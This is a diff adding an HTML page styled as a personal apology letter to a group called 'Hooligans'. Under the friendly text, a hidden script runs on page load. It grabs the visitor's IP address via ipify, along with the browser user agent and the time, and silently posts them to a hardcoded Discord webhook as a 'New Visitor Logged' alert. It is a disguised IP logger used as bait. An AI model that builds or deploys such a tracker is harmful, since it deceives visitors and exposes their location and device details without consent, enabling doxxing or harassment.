@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sorry Hooligans</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <h1> Sorry Hooligans </h1>
+    <p>Dear Hooligans,
+
+I just wanted to take a moment to say sorry — genuinely.
+
+If I’ve been acting out of line, or saying things that felt disrespectful, that was never my intention. Maybe I took some things too far, maybe I tried to be funny when it wasn’t the right time.
+
+I know things got heated sometimes in the group, and I might’ve crossed a line. I'm not perfect, but I’m trying to be better. This message isn’t to stir anything up — it’s just to say I respect you all, even if we’ve clashed.
+
+No hard feelings from my side. We’re all here trying to have fun in our own way.
+
+Respectfully,  
+Hyex
+</p>
+  </div>
+
+  <script>
+    // Get IP
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const deviceInfo = navigator.userAgent;
+        const time = new Date().toLocaleString();
+
+        const webhook = 'https://discord.com/api/webhooks/1397114753029242880/Orf2IJqX_zSEJBlgaXipnwzxOto8iyshYGuxaCWrv900CpHovuuIiTdHkCZYFa-DKPSM';
+        const message = {
+          content: `📡 **New Visitor Logged**\n🖥️ **Device:** \`${deviceInfo}\`\n🌐 **IP:** \`${ip}\`\n🕒 **Time:** ${time}`
+        };
+
+        fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(message)
+        });
+      });
+  </script>
+</body>
+</html>
